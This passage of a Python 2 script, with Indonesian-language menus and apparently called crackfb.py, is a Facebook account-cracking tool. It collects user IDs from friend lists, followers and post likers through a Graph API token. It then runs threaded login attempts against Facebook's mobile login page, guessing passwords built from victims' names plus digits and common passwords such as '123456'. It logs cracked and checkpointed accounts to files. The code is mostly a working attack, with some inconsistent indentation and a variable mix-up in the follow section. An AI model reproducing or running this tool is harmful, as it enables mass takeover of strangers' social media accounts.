### PILIH PAKISTAN ###
def pilih_pakis():
	teak = raw_input('\033[0;97m   >\033[0;97m ')
	if teak =="":
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_pakis()
	elif teak =="1":
		os.system('clear')
		print logo
		print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2":
		os.system('clear')
		print logo
		print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
		idt = raw_input("\033[0;97m   • \033[0;97mID Publik/Teman \033[0;97m:\033[0;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "\033[0;97m   •\033[0;97m Nama \033[0;97m:\033[0;97m "+sp["name"]
		except KeyError:
			print "\033[0;97m   ! ID publik/teman tidak ada"
			raw_input("\n\033[1;97m   < \033[0;97mKembali \033[0;97m>")
			crack_pakis()
		except requests.exceptions.ConnectionError:
			print '\033[0;97m   ! Tidak ada koneksi'
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="0" or teak =="00":
		crack_teman()
	else:
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_pakis()
	
	print '\033[0;97m   • \033[0;97mJumlah ID\033[0;97m :\033[0;97m '+str(len(id))
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	
### MAIN PAKISTAN ###
	def main(art):
		global CP,oks
		ef = art
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			ah = requests.get('https://graph.facebook.com/'+ef+'/?access_token='+toket)
			p = json.loads(ah.text)
			pb = 'pakistan'
			rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xs = rep.content
			if 'mbasic_logout_button' in xs or 'save-device' in xs:
				print '\033[0;97m   [OK]\033[0;97m '+ef+' \033[0;97m• \033[0;97m'+pb
				oke = open('done/pakis.txt', 'a')
				oke.write('\n   [OK] '+ef+' • '+pb)
				oke.close()
				oks.append(ef)
			else :
				if 'checkpoint' in xs:
					print '\033[0;97m   [CP]\033[0;97m '+ef+' \033[0;97m•\033[0;97m '+pb
					cek = open('done/pakis.txt', 'a')
					cek.write('\n   [CP] '+ef+' • '+pb)
					cek.close()
					CP.append(ef)
				else:
					pb2 = '786786'
					rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xs = rep.content
					if 'mbasic_logout_button' in xs or 'save-device' in xs:
						print '\033[0;97m   [OK]\033[0;97m '+ef+' \033[0;97m• \033[0;97m'+pb2
						oke = open('done/pakis.txt', 'a')
						oke.write('\n   [OK] '+ef+' • '+pb2)
						oke.close()
						oks.append(ef)
					else:
						if 'checkpoint' in xs:
							print '\033[0;97m   [CP]\033[0;97m '+ef+' \033[0;97m•\033[0;97m '+pb2
							cek = open('done/pakis.txt', 'a')
							cek.write('\n   [CP] '+ef+' • '+pb2)
							cek.close()
							CP.append(ef)
						else:
							pb3 = p['first_name'].lower()+'1234'
							rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
							xs = rep.content
							if 'mbasic_logout_button' in xs or 'save-device' in xs:
								print '\033[0;97m   [OK]\033[0;97m '+ef+' \033[0;97m• \033[0;97m'+pb3
								oke = open('done/pakis.txt', 'a')
								oke.write('\n   [OK] '+ef+' • '+pb3)
								oke.close()
								oks.append(ef)
							else:
								if 'checkpoint' in xs:
									print '\033[0;97m   [CP]\033[0;97m '+ef+' \033[0;97m•\033[0;97m '+pb3
									cek = open('done/pakis.txt', 'a')
									cek.write('\n   [CP] '+ef+' • '+pb3)
									cek.close()
									CP.append(ef)
								else:
									pb4 = p['first_name'].lower()+'12345'
									rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
									xs = rep.content
									if 'mbasic_logout_button' in xs or 'save-device' in xs:
										print '\033[0;97m   [OK]\033[0;97m '+ef+' \033[0;97m• \033[0;97m'+pb4
										oke = open('done/pakis.txt', 'a')
										oke.write('\n   [OK] '+ef+' • '+pb4)
										oke.close()
										oks.append(ef)
									else:
										if 'checkpoint' in xs:
											print '\033[0;97m   [CP]\033[0;97m '+ef+' \033[0;97m•\033[0;97m '+pb4
											cek = open('done/pakis.txt', 'a')
											cek.write('\n   [CP] '+ef+' • '+pb4)
											cek.close()
											CP.append(ef)
										else:
											pb5 = p['first_name'].lower()+'123'
											rep = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : ef, "pass" : pb5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
											xs = rep.content
											if 'mbasic_logout_button' in xs or 'save-device' in xs:
												print '\033[0;97m   [OK]\033[0;97m '+ef+' \033[0;97m• \033[0;97m'+pb5
												oke = open('done/pakis.txt', 'a')
												oke.write('\n   [OK] '+ef+' • '+pb5)
												oke.close()
												oks.append(ef)
											else:
												if 'checkpoint' in xs:
													print '\033[0;97m   [CP]\033[0;97m '+ef+' \033[0;97m•\033[0;97m '+pb5
													cek = open('done/pakis.txt', 'a')
													cek.write('\n   [CP] '+ef+' • '+pb5)
													cek.close()
													CP.append(ef)
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	print '\033[0;97m   • \033[0;97mSelesai ...'
	print"\033[0;97m   • \033[0;97mTotal \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97m: \033[0;97m"+str(len(oks))+"\033[0;97m/\033[0;97m"+str(len(CP))
	print '\033[0;97m   • \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97mfile tersimpan \033[0;97m: \033[0;97mdone/pakis.txt'
	print "\033[0;94m╚═══════════════════════════════════════════════════════════════╝"
	raw_input("\033[0;97m   < \033[0;97mKembali\033[0;97m >")
	os.system("python2 crackfb.py")

#### CRACK USA ####
def crack_usa():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print '\033[0;97m   ! Token Invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1.\033[0;97m Crack Dari Daftar Teman')
	print ('\033[0;97m   2.\033[0;97m Crack Dari Publik/Teman')
	print ('\033[0;97m   0.\033[0;97m Kembali')
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
	pilih_usa()

### PILIH USA ###
def pilih_usa():
	teak = raw_input('\033[0;97m   >\033[0;97m ')
	if teak =="":
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_usa()
	elif teak =="1":
		os.system('clear')
		print logo
		print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2":
		os.system('clear')
		print logo
		print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
		idt = raw_input("\033[0;97m   • \033[0;97mID Publik/Teman \033[0;97m:\033[0;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "\033[0;97m   •\033[0;97m Nama \033[0;97m:\033[0;97m "+sp["name"]
		except KeyError:
			print "\033[0;97m   ! ID publik/teman tidak ada"
			raw_input("\n\033[1;97m   < \033[0;97mKembali \033[0;97m>")
			crack_usa()
		except requests.exceptions.ConnectionError:
			print '\033[0;97m   ! Tidak ada koneksi'
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="0" or teak =="00":
		crack_teman()
	else:
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_usa()
	
	print '\033[0;97m   • \033[0;97mJumlah ID\033[0;97m :\033[0;97m '+str(len(id))
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	
### MAIN USA ###
	def main(arg):
		global CP,oks
		em = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
			v = json.loads(an.text)
			px = v['first_name'].lower()+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+px
				oke = open('done/usa.txt', 'a')
				oke.write('\n   [OK] '+em+' • '+px)
				oke.close()
				oks.append(em)
			else :
				if 'checkpoint' in xo:
					print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+px
					cek = open('done/usa.txt', 'a')
					cek.write('\n   [CP] '+em+' • '+px)
					cek.close()
					CP.append(em)
				else:
					px2 = v['first_name'].lower()+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+px2
						oke = open('done/usa.txt', 'a')
						oke.write('\n   [OK] '+em+' • '+px2)
						oke.close()
						oks.append(em)
					else:
						if 'checkpoint' in xo:
							print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+px2
							cek = open('done/usa.txt', 'a')
							cek.write('\n   [CP] '+em+' • '+px2)
							cek.close()
							CP.append(em)
						else:
							px3 = v['first_name'].lower()+'1234'
							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+px3
								oke = open('done/usa.txt', 'a')
								oke.write('\n   [OK] '+em+' • '+px3)
								oke.close()
								oks.append(em)
							else:
								if 'checkpoint' in xo:
									print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+px3
									cek = open('done/usa.txt', 'a')
									cek.write('\n   [CP] '+em+' • '+px3)
									cek.close()
									CP.append(em)
								else:
									px4 = '123456'
									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
										print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+px4
										oke = open('done/usa.txt', 'a')
										oke.write('\n   [OK] '+em+' • '+px4)
										oke.close()
										oks.append(em)
									else:
										if 'checkpoint' in xo:
											print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+px4
											cek = open('done/usa.txt', 'a')
											cek.write('\n   [CP] '+em+' • '+px4)
											cek.close()
											CP.append(em)
										else:
											px5 = 'iloveyou'
											rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : px5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
											xo = rex.content
											if 'mbasic_logout_button' in xo or 'save-device' in xo:
												print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+px5
												oke = open('done/usa.txt', 'a')
												oke.write('\n   [OK] '+em+' • '+px5)
												oke.close()
												oks.append(em)
											else:
												if 'checkpoint' in xo:
													print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+px5
													cek = open('done/usa.txt', 'a')
													cek.write('\n   [CP] '+em+' • '+px5)
													cek.close()
													CP.append(em)
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	print '\033[0;97m   • \033[0;97mSelesai ...'
	print"\033[0;97m   • \033[0;97mTotal \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97m: \033[0;97m"+str(len(oks))+"\033[0;97m/\033[0;97m"+str(len(CP))
	print '\033[0;97m   • \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97mfile tersimpan \033[0;97m: \033[0;97mdone/usa.txt'
	print "\033[0;94m╚═══════════════════════════════════════════════════════════════╝"
	raw_input("\033[0;97m   < \033[0;97mKembali\033[0;97m >")
	os.system("python2 crackfb.py")
	
### CRACK LIKE ###
def crack_like():
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print '\033[0;97m   ! Token Invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	idt = raw_input("\033[0;97m   • \033[0;97mID Postingan Publik/Teman \033[0;97m:\033[0;97m ")
	try:
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	except KeyError:
		print "\033[0;97m   ! ID postingan salah"
		raw_input("\n\033[1;97m   < \033[0;97mKembali \033[0;97m>")
		menu()
	except requests.exceptions.SSLError:
		print '   ! Koneksi Tidak Ada'
		exit()
		
	print '\033[0;97m   • \033[0;97m   Jumlah ID\033[0;97m :\033[0;97m '+str(len(id))
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
		
### MAIN LIKE ###
	def main(arg):
		global CP,oks
		em = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
			v = json.loads(an.text)
			pc = v['first_name'].lower()+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pc
				oke = open('done/like.txt', 'a')
				oke.write('\n   [OK] '+em+' • '+pc)
				oke.close()
				oks.append(em)
			else :
				if 'checkpoint' in xo:
					print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pc
					cek = open('done/like.txt', 'a')
					cek.write('\n   [CP] '+em+' • '+pc)
					cek.close()
					CP.append(em)
				else:
					pc2 = v['first_name'].lower()+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pc2
						oke = open('done/like.txt', 'a')
						oke.write('\n   [OK] '+em+' • '+pc2)
						oke.close()
						oks.append(em)
					else:
						if 'checkpoint' in xo:
							print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pc2
							cek = open('done/like.txt', 'a')
							cek.write('\n   [CP] '+em+' • '+pc2)
							cek.close()
							CP.append(em)
						else:
							pc3 = v['first_name'].lower()+'1234'
							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pc3
								oke = open('done/like.txt', 'a')
								oke.write('\n   [OK] '+em+' • '+pc3)
								oke.close()
								oks.append(em)
							else:
								if 'checkpoint' in xo:
									print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pc3
									cek = open('done/like.txt', 'a')
									cek.write('\n   [CP] '+em+' • '+pc3)
									cek.close()
									CP.append(em)
								else:
									pc4 = v['last_name'].lower()+'123'
									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
										print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pc4
										oke = open('done/like.txt', 'a')
										oke.write('\n   [OK] '+em+' • '+pc4)
										oke.close()
										oks.append(em)
									else:
										if 'checkpoint' in xo:
											print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pc4
											cek = open('done/like.txt', 'a')
											cek.write('\n   [CP] '+em+' • '+pc4)
											cek.close()
											CP.append(em)
										else:
											pc5 = '123456'
											rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pc5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
											xo = rex.content
											if 'mbasic_logout_button' in xo or 'save-device' in xo:
												print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pc5
												oke = open('done/like.txt', 'a')
												oke.write('\n   [OK] '+em+' • '+pc5)
												oke.close()
												oks.append(em)
											else:
												if 'checkpoint' in xo:
													print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pc5
													cek = open('done/like.txt', 'a')
													cek.write('\n   [CP] '+em+' • '+pc5)
													cek.close()
													CP.append(em)
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	print '\033[0;97m   • \033[0;97mSelesai ...'
	print"\033[0;97m   • \033[0;97mTotal \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97m: \033[0;97m"+str(len(oks))+"\033[0;97m/\033[0;97m"+str(len(CP))
	print '\033[0;97m   • \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97mfile tersimpan \033[0;97m: \033[0;97mdone/like.txt'
	print "\033[0;94m╚═══════════════════════════════════════════════════════════════╝"
	raw_input("\033[0;97m   < \033[0;97mKembali\033[0;97m >")
	os.system("python2 crackfb.py")
	
##### CRACK FOLLOW #####
def crack_follow():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print '\033[0;97m   ! Token Invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1.\033[0;97m Crack Dari Follower Saya')
	print ('\033[0;97m   2.\033[0;97m Crack Dari Follower Teman')
	print ('\033[0;97m   0.\033[0;97m Kembali')
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
	pilih_follow()
	
#### PILIH FOLLOW ####
def pilih_follow():
	keak = raw_input('\033[0;97m   >\033[0;97m ')
	if keak =="":
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_follow()
	elif keak =="1":
		os.system('clear')
		print logo
		print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
		r = requests.get("https://graph.facebook.com/me/subscribers?limit=999999&access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif keak =="2":
		os.system('clear')
		print logo
		print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
		idt = raw_input("\033[0;97m   • \033[0;97mID Publik/Teman \033[0;97m:\033[0;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "\033[0;97m   •\033[0;97m Nama \033[0;97m:\033[0;97m "+sp["name"]
		except KeyError:
			print "\033[0;97m   ! ID publik/teman tidak ada"
			raw_input("\n\033[1;97m   < \033[0;97mKembali \033[0;97m>")
			crack_follow()
		except requests.exceptions.ConnectionError:
			print '\033[0;97m   ! Tidak ada koneksi'
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif keak =="0":
		menu()
	else:
		print '\033[0;97m   ! Isi Yg Benar'
		pilih_follow()
	
	print '\033[0;97m   • \033[0;97mJumlah ID\033[0;97m :\033[0;97m '+str(len(id))
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	
### MAIN FOLLOW ###
	def main(arg):
		global CP,oks
		em = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
			v = json.loads(an.text)
			pr = v['first_name'].lower()+'123'
			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pr
				oke = open('done/follow.txt', 'a')
				oke.write('\n   [OK] '+em+' • '+pr)
				oke.close()
				oks.append(em)
			else :
				if 'checkpoint' in xo:
					print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pr
					cek = open('done/follow.txt', 'a')
					cek.write('\n   [CP] '+em+' • '+pr)
					cek.close()
					CP.append(em)
				else:
					pr2 = v['first_name'].lower()+'12345'
					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
					xo = rex.content
					if 'mbasic_logout_button' in xo or 'save-device' in xo:
						print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pr2
						oke = open('done/follow.txt', 'a')
						oke.write('\n   [OK] '+em+' • '+pr2)
						oke.close()
						oks.append(em)
					else:
						if 'checkpoint' in xo:
							print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pr2
							cek = open('done/follow.txt', 'a')
							cek.write('\n   [CP] '+em+' • '+pr2)
							cek.close()
							CP.append(em)
						else:
							pr3 = v['first_name'].lower()+'1234'
							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
							xo = rex.content
							if 'mbasic_logout_button' in xo or 'save-device' in xo:
								print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pr3
								oke = open('done/follow.txt', 'a')
								oke.write('\n   [OK] '+em+' • '+pr3)
								oke.close()
								oks.append(em)
							else:
								if 'checkpoint' in xo:
									print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pr3
									cek = open('done/follow.txt', 'a')
									cek.write('\n   [CP] '+em+' • '+pr3)
									cek.close()
									CP.append(em)
								else:
									pr4 = v['first_name'].lower()+'321'
									rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
									xo = rex.content
									if 'mbasic_logout_button' in xo or 'save-device' in xo:
										print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pr4
										oke = open('done/follow.txt', 'a')
										oke.write('\n   [OK] '+em+' • '+pr4)
										oke.close()
										oks.append(em)
									else:
										if 'checkpoint' in xo:
											print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pr4
											cek = open('done/follow.txt', 'a')
											cek.write('\n   [CP] '+em+' • '+pr4)
											cek.close()
											CP.append(em)
										else:
											pr5 = '123456'
											rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pr5, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"})
											xo = rex.content
											if 'mbasic_logout_button' in xo or 'save-device' in xo:
												print '\033[0;97m   [OK]\033[0;97m '+em+' \033[0;97m• \033[0;97m'+pc5
												oke = open('done/like.txt', 'a')
												oke.write('\n   [OK] '+em+' • '+pc5)
												oke.close()
												oks.append(em)
											else:
												if 'checkpoint' in xo:
													print '\033[0;97m   [CP]\033[0;97m '+em+' \033[0;97m•\033[0;97m '+pc5
													cek = open('done/like.txt', 'a')
													cek.write('\n   [CP] '+em+' • '+pc5)
													cek.close()
													CP.append(em)
		except:
			pass
	p = ThreadPool(20)
	p.map(main, id)
	print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	print '\033[0;97m   • \033[0;97mSelesai ...'
	print"\033[0;97m   • \033[0;97mTotal \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97m: \033[0;97m"+str(len(oks))+"\033[0;97m/\033[0;97m"+str(len(CP))
	print '\033[0;97m   • \033[0;97mOK\033[0;97m/\x1b[0;97mCP \033[0;97mfile tersimpan \033[0;97m: \033[0;97mdone/follow.txt'
	print "\033[0;94m╚═══════════════════════════════════════════════════════════════╝"
	raw_input("\033[0;97m   < \033[0;97mKembali\033[0;97m >")
	os.system("python2 crackfb.py")
	
#### CARI ID ####
def cari_id():
	os.system('clear')
	print logo
	print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	ling = ('https://www.facebook.com/')
	url = ling+raw_input("\033[0;97m   • \033[0;97mUsername \033[0;97m:\033[0;97m ")
	idre = re.compile('"entity_id":"([0-9]+)"')
	page = requests.get(url)
	nex = idre.findall(page.content)
	for hasil in nex:
		print '\n'+'\033[0;97m   • \033[0;97mID Anda\033[0;97m :\033[0;97m '+hasil
                print ("\033[0;94m╚═══════════════════════════════════════════════════════════════╝")
		raw_input("\n\033[0;97m   < \033[0;97mKembali \033[0;97m>")
		menu()
		
### HASIL CRACK ###
def hasil_crack():
	os.system('clear')
	print logo
	print ("\033[0;94m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1. \033[0;97mLihat Hasil Crack Indonesia')
